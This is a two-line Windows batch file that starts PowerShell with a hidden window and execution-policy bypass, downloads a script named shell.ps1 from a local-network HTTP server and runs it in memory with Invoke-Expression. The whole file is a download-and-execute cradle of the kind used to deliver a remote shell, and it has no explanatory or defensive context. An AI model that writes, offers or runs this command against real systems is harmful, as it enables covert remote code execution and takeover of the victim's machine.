@echo off
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://192.168.1.8:8000/shell.ps1')"
